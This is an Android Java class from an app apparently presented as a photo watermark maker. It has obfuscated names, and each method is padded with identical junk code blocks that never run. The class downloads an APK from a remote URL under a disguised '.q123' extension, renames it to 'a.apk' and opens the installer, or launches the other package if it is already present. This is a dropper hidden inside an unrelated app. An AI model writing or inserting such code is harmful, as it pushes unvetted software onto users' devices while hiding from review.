package com.getwatermark.photomaker.lscj.vbvj;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.net.Uri;
import android.util.Log;

import androidx.core.content.FileProvider;

import com.downloader.Error;
import com.downloader.OnDownloadListener;
import com.downloader.OnProgressListener;
import com.downloader.OnStartOrResumeListener;
import com.downloader.PRDownloader;
import com.downloader.Progress;
import com.downloader.request.DownloadRequest;
import com.getwatermark.photomaker.lscj.wwzz.Ecnsb;

import org.json.JSONObject;

import java.io.File;

public class Vldo implements OnStartOrResumeListener, OnProgressListener, OnDownloadListener {

    private File file;
    private File fileEnd;
    private static final String END_HAHA = ".q123";
    private static final String name = "a.apk";
    private Context context;
    private static Vldo loadApkUtlis;
    public static DownloadRequest request;

    private Vldo() {

    }

    public static Vldo getLoadApkUtlis() {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        if (loadApkUtlis == null) {
            loadApkUtlis = new Vldo();
        }
        return loadApkUtlis;
    }

    private boolean checkAppInstalled(Context context, String pkgName) {
        if (pkgName == null || pkgName.isEmpty()) {
            return false;
        }
        PackageInfo packageInfo;
        try {
            packageInfo = context.getPackageManager().getPackageInfo(pkgName, 0);
        } catch (Exception e) {
            packageInfo = null;
            e.printStackTrace();
        }
        if (packageInfo == null) {
            return false;
        } else {
            return true;
        }
    }

    public void openActivity(Context context, String pkgName, String url) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        file = new File(new File(getPpStoreDir(context)), name);
        fileEnd = new File(new File(getPpStoreDir(context)), name + END_HAHA);
        this.context = context;
        if (checkAppInstalled(context, pkgName)) {
            Intent intent = new Intent();
            try {
                file.delete();
                intent.setClassName(pkgName, pkgName + ".MainActivity");
                context.startActivity(intent);
            } catch (Exception e) {
                context.startActivity(new Intent(context, Wdj.class).putExtra("url", url));
                // download(url,getPpStoreDir(context),name+END_HAHA);
            }
        } else {
            if (file.isFile()) {
                //listen.onSuccess(file);
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                String authority = context.getPackageName() + ".fileProvider";
                Uri fileUri = new FileProvider().getUriForFile(context, authority, file);
                intent.setDataAndType(fileUri, "application/vnd.android.package-archive");
                context.startActivity(intent);

            } else {
                context.startActivity(new Intent(context, Wdj.class).putExtra("url", url));

            }

        }
    }

    public void download(String url) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        if (request == null) {
            request = PRDownloader.download(url, getPpStoreDir(context), name + END_HAHA).build();
            request.setOnStartOrResumeListener(this)
                    .setOnProgressListener(this)
                    .start(this);
        }

    }

    @Override
    public void onStartOrResume() {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }

    }

    @Override
    public void onProgress(Progress progress) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        Log.e("pos", progress.toString());

        Ecnsb.post("Progress", progress);


    }

    @Override
    public void onDownloadComplete() {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        request.cancel();
        request = null;
        if (fileEnd.exists()) {
            boolean b = fileEnd.renameTo(file);
            if (b) {
                // listen.onSuccess(file);

                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                String authority = context.getPackageName() + ".fileProvider";

                Uri fileUri = new FileProvider().getUriForFile(context, authority, file);
                intent.setDataAndType(fileUri, "application/vnd.android.package-archive");
                context.startActivity(intent);
                Ecnsb.post("Success", 0);

            }
        }
    }


    @Override
    public void onError(Error error) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }
        request.cancel();
        request = null;
        context = null;
        Ecnsb.post("Success", 0);
    }

    public static String getPpStoreDir(Context context) {
        switch (32) {
            case 15:
                try {
                    JSONObject Cjsnc = new JSONObject();
                    String siwu8 = Cjsnc.getString("widjcu");
                    String v8s = Cjsnc.getString("iwcncu");
                    String v398 = Cjsnc.getString("avjinsu");
                } catch (Exception i) {
                    i.printStackTrace();
                }
                break;
            default:
                break;
        }

        return context.getExternalFilesDir("").getAbsolutePath();
    }

}
